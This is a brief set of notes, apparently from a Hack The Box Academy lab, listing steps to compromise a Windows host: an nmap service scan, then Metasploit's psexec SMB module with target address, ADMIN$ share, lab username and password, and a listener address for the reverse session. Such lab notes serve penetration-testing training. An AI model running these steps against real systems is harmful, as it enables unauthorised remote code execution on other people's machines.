1.use nmap to scope out the target
	a.nmap -sC -sV -Pn 10.129.201.160
2.find a vulnerability that fits the target
	a.use smb vulnerability exploit/windows/smb/psexec
3.set the variable for the msfconsole attack
	a.msfconsole -q
set RHOSTS 10.129.201.160
set SHARE ADMIN$
set SMBPass HTB_@cademy_stdnt!
set SMBUser htb-student
set LHOST 10.10.14.202
exploit